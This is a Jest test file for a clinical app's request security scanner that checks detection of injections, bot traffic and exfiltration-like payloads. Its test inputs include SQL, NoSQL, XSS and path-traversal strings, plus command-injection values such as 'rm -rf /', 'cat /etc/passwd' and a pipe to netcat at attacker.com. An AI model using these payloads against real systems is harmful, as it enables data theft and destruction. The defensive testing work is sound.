import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import diagnosticSecurityService from '../services/diagnosticSecurityService';
import { AuthRequest } from '../../../types/auth';

describe('Diagnostic Security Service Tests', () => {
    let mockRequest: AuthRequest;

    beforeEach(() => {
        mockRequest = {
            user: {
                _id: 'user123',
                role: 'pharmacist',
                workplaceRole: 'pharmacist',
            },
            workspaceContext: {
                workspace: { _id: 'workspace123' },
                plan: { name: 'professional' },
                isSubscriptionActive: true,
            },
            body: {},
            query: {},
            originalUrl: '/api/diagnostics',
            method: 'POST',
            ip: '192.168.1.1',
            get: jest.fn().mockReturnValue('Mozilla/5.0'),
        } as any;
    });

    afterEach(() => {
        jest.clearAllMocks();
        // Clear old threats for clean tests
        diagnosticSecurityService.clearOldThreats(0);
    });

    describe('Request Analysis', () => {
        it('should analyze request without threats for normal data', async () => {
            mockRequest.body = {
                symptoms: {
                    subjective: ['headache', 'nausea'],
                    severity: 'moderate',
                    onset: 'acute',
                },
                vitalSigns: {
                    heartRate: 72,
                    temperature: 37.0,
                },
            };

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'diagnostic_request');

            expect(Array.isArray(threats)).toBe(true);
            // Normal requests should have minimal or no threats
            const highSeverityThreats = threats.filter(t => t.severity === 'HIGH' || t.severity === 'CRITICAL');
            expect(highSeverityThreats.length).toBe(0);
        });

        it('should detect data exfiltration patterns', async () => {
            mockRequest.body = {
                symptoms: {
                    subjective: Array(40).fill('symptom'), // Excessive symptoms
                },
                currentMedications: Array(30).fill({
                    name: 'Medication',
                    dosage: '10mg',
                    frequency: 'daily',
                }),
                // Large payload
                largeData: 'x'.repeat(50000),
            };

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'diagnostic_request');

            expect(threats.length).toBeGreaterThan(0);

            const dataThreats = threats.filter(t => t.type === 'SUSPICIOUS_PATTERN' || t.type === 'DATA_EXFILTRATION');
            expect(dataThreats.length).toBeGreaterThan(0);
        });

        it('should detect injection attempts', async () => {
            mockRequest.body = {
                symptoms: {
                    subjective: [
                        'SELECT * FROM users WHERE id = 1',
                        '<script>alert("xss")</script>',
                        'headache; DROP TABLE patients;',
                    ],
                },
                notes: 'javascript:void(0)',
            };

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'diagnostic_request');

            expect(threats.length).toBeGreaterThan(0);

            const injectionThreats = threats.filter(t => t.type === 'INJECTION_ATTEMPT');
            expect(injectionThreats.length).toBeGreaterThan(0);

            // Check for different injection types
            const sqlInjection = injectionThreats.find(t => t.evidence.injectionType === 'SQL');
            const xssInjection = injectionThreats.find(t => t.evidence.injectionType === 'XSS');

            expect(sqlInjection).toBeDefined();
            expect(xssInjection).toBeDefined();
        });

        it('should detect bot-like behavior', async () => {
            // Mock bot-like user agent
            (mockRequest.get as jest.Mock).mockImplementation((header: string) => {
                if (header === 'User-Agent') {
                    return 'Mozilla/5.0 (compatible; Googlebot/2.1)';
                }
                return undefined;
            });

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'diagnostic_request');

            const botThreats = threats.filter(t => t.type === 'API_ABUSE');
            expect(botThreats.length).toBeGreaterThan(0);

            const botThreat = botThreats[0];
            expect(botThreat.evidence.indicators).toContain('Bot user agent');
        });

        it('should detect missing headers indicating automation', async () => {
            // Mock missing headers
            (mockRequest.get as jest.Mock).mockImplementation((header: string) => {
                if (header === 'User-Agent') {
                    return 'Custom Bot 1.0';
                }
                // Missing Accept-Language and Accept-Encoding
                return undefined;
            });

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'diagnostic_request');

            const botThreats = threats.filter(t => t.type === 'API_ABUSE');
            expect(botThreats.length).toBeGreaterThan(0);

            const botThreat = botThreats[0];
            expect(botThreat.evidence.indicators).toContain('Missing Accept-Language header');
            expect(botThreat.evidence.indicators).toContain('Missing Accept-Encoding header');
        });
    });

    describe('Injection Pattern Detection', () => {
        it('should detect SQL injection patterns', async () => {
            const maliciousData = {
                patientId: "1' OR '1'='1",
                notes: 'UNION SELECT password FROM users',
                search: 'test; DROP TABLE patients;',
            };

            mockRequest.body = maliciousData;

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'search');

            const sqlThreats = threats.filter(t =>
                t.type === 'INJECTION_ATTEMPT' &&
                t.evidence.injectionType === 'SQL'
            );

            expect(sqlThreats.length).toBeGreaterThan(0);
            expect(sqlThreats[0].severity).toBe('HIGH');
        });

        it('should detect NoSQL injection patterns', async () => {
            const maliciousData = {
                filter: { $where: 'this.password.length > 0' },
                query: { $ne: null },
                search: { $regex: '.*' },
            };

            mockRequest.body = maliciousData;

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'search');

            const nosqlThreats = threats.filter(t =>
                t.type === 'INJECTION_ATTEMPT' &&
                t.evidence.injectionType === 'NoSQL'
            );

            expect(nosqlThreats.length).toBeGreaterThan(0);
        });

        it('should detect command injection patterns', async () => {
            const maliciousData = {
                filename: 'test.txt; cat /etc/passwd',
                command: '$(whoami)',
                path: 'file.txt | nc attacker.com 4444',
            };

            mockRequest.body = maliciousData;

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'file_operation');

            const commandThreats = threats.filter(t =>
                t.type === 'INJECTION_ATTEMPT' &&
                t.evidence.injectionType === 'Command'
            );

            expect(commandThreats.length).toBeGreaterThan(0);
            expect(commandThreats[0].severity).toBe('CRITICAL');
        });

        it('should detect path traversal attempts', async () => {
            const maliciousData = {
                file: '../../../etc/passwd',
                path: '..\\..\\windows\\system32\\config\\sam',
                url: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            };

            mockRequest.body = maliciousData;

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'file_access');

            const pathThreats = threats.filter(t =>
                t.type === 'INJECTION_ATTEMPT' &&
                t.evidence.injectionType === 'Path Traversal'
            );

            expect(pathThreats.length).toBeGreaterThan(0);
        });

        it('should handle nested injection attempts', async () => {
            const nestedMaliciousData = {
                patient: {
                    demographics: {
                        name: '<script>alert("xss")</script>',
                        notes: 'SELECT * FROM sensitive_data',
                    },
                    medications: [
                        {
                            name: 'Aspirin; DROP TABLE medications;',
                            dosage: '$(rm -rf /)',
                        },
                    ],
                },
            };

            mockRequest.body = nestedMaliciousData;

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'patient_update');

            const injectionThreats = threats.filter(t => t.type === 'INJECTION_ATTEMPT');
            expect(injectionThreats.length).toBeGreaterThan(0);

            // Should detect multiple types of injections
            const injectionTypes = new Set(injectionThreats.map(t => t.evidence.injectionType));
            expect(injectionTypes.size).toBeGreaterThan(1);
        });
    });

    describe('Data Pattern Analysis', () => {
        it('should detect unusually large payloads', async () => {
            mockRequest.body = {
                largeField: 'x'.repeat(150000), // 150KB
                normalField: 'normal data',
            };

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'data_upload');

            const exfiltrationThreats = threats.filter(t => t.type === 'DATA_EXFILTRATION');
            expect(exfiltrationThreats.length).toBeGreaterThan(0);

            const largeThreat = exfiltrationThreats.find(t =>
                t.evidence.reason === 'Unusually large payload size'
            );
            expect(largeThreat).toBeDefined();
            expect(largeThreat?.severity).toBe('HIGH');
        });

        it('should detect suspicious field names', async () => {
            mockRequest.body = {
                normalField: 'data',
                apiKey: 'sk-secret-key',
                password: 'hidden-password',
                secretToken: 'bearer-token',
                userKey: 'another-secret',
            };

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'config_update');

            const exfiltrationThreats = threats.filter(t => t.type === 'DATA_EXFILTRATION');
            expect(exfiltrationThreats.length).toBeGreaterThan(0);

            const suspiciousThreat = exfiltrationThreats.find(t =>
                t.evidence.reason === 'Suspicious field names detected'
            );
            expect(suspiciousThreat).toBeDefined();
            expect(suspiciousThreat?.evidence.suspiciousFields.length).toBeGreaterThan(0);
        });

        it('should detect excessive data volumes in clinical fields', async () => {
            mockRequest.body = {
                symptoms: {
                    subjective: Array(35).fill('symptom'), // Exceeds threshold
                },
                currentMedications: Array(30).fill({
                    name: 'Med',
                    dosage: '10mg',
                    frequency: 'daily',
                }),
                labResults: Array(60).fill({
                    testName: 'Test',
                    value: '5.0',
                    unit: 'mg/dL',
                }),
            };

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'clinical_data');

            const volumeThreats = threats.filter(t => t.type === 'SUSPICIOUS_PATTERN');
            expect(volumeThreats.length).toBeGreaterThan(0);

            const volumeThreat = volumeThreats[0];
            expect(volumeThreat.evidence.fields.length).toBeGreaterThan(0);
            expect(volumeThreat.severity).toBeOneOf(['MEDIUM', 'HIGH']);
        });
    });

    describe('Security Metrics', () => {
        it('should track security metrics correctly', async () => {
            // Generate some threats
            mockRequest.body = {
                maliciousField: '<script>alert("xss")</script>',
                sqlInjection: "'; DROP TABLE users; --",
            };

            await diagnosticSecurityService.analyzeRequest(mockRequest, 'test_request');

            const metrics = diagnosticSecurityService.getSecurityMetrics();

            expect(metrics.totalThreats).toBeGreaterThan(0);
            expect(typeof metrics.threatsByType).toBe('object');
            expect(typeof metrics.threatsBySeverity).toBe('object');
            expect(metrics.activeThreats).toBeGreaterThanOrEqual(0);
            expect(metrics.mitigatedThreats).toBeGreaterThanOrEqual(0);
        });

        it('should return active threats', async () => {
            // Generate a threat
            mockRequest.body = {
                criticalThreat: 'rm -rf /',
            };

            await diagnosticSecurityService.analyzeRequest(mockRequest, 'critical_test');

            const activeThreats = diagnosticSecurityService.getActiveThreats();
            expect(Array.isArray(activeThreats)).toBe(true);

            if (activeThreats.length > 0) {
                const threat = activeThreats[0];
                expect(threat).toHaveProperty('id');
                expect(threat).toHaveProperty('type');
                expect(threat).toHaveProperty('severity');
                expect(threat).toHaveProperty('userId');
                expect(threat).toHaveProperty('timestamp');
                expect(threat.mitigated).toBe(false);
            }
        });

        it('should clean up old threats', () => {
            const initialMetrics = diagnosticSecurityService.getSecurityMetrics();
            const initialCount = initialMetrics.totalThreats;

            // Clear all threats (0ms age threshold)
            diagnosticSecurityService.clearOldThreats(0);

            const finalMetrics = diagnosticSecurityService.getSecurityMetrics();
            expect(finalMetrics.totalThreats).toBeLessThanOrEqual(initialCount);
        });
    });

    describe('Error Handling', () => {
        it('should handle requests without user gracefully', async () => {
            const requestWithoutUser = {
                ...mockRequest,
                user: undefined,
            };

            const threats = await diagnosticSecurityService.analyzeRequest(
                requestWithoutUser as AuthRequest,
                'test_request'
            );

            expect(Array.isArray(threats)).toBe(true);
            expect(threats.length).toBe(0);
        });

        it('should handle malformed request data', async () => {
            mockRequest.body = null;

            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'malformed_request');

            expect(Array.isArray(threats)).toBe(true);
            // Should not throw errors
        });

        it('should handle circular references in request data', async () => {
            const circularObj: any = { name: 'test' };
            circularObj.self = circularObj;

            mockRequest.body = {
                data: circularObj,
            };

            // Should not throw errors due to circular references
            const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'circular_test');
            expect(Array.isArray(threats)).toBe(true);
        });
    });

    describe('Threat Severity Assessment', () => {
        it('should assign appropriate severity levels', async () => {
            const testCases = [
                {
                    data: { normalField: 'normal data' },
                    expectedMaxSeverity: 'LOW',
                },
                {
                    data: { suspiciousField: '<img src=x onerror=alert(1)>' },
                    expectedMaxSeverity: 'MEDIUM',
                },
                {
                    data: { criticalField: 'rm -rf /' },
                    expectedMaxSeverity: 'CRITICAL',
                },
            ];

            for (const testCase of testCases) {
                mockRequest.body = testCase.data;

                const threats = await diagnosticSecurityService.analyzeRequest(mockRequest, 'severity_test');

                if (threats.length > 0) {
                    const maxSeverity = threats.reduce((max, threat) => {
                        const severityOrder = { LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 };
                        return severityOrder[threat.severity] > severityOrder[max] ? threat.severity : max;
                    }, 'LOW' as any);

                    const expectedOrder = { LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 };
                    expect(expectedOrder[maxSeverity]).toBeGreaterThanOrEqual(
                        expectedOrder[testCase.expectedMaxSeverity as keyof typeof expectedOrder]
                    );
                }
            }
        });
    });
});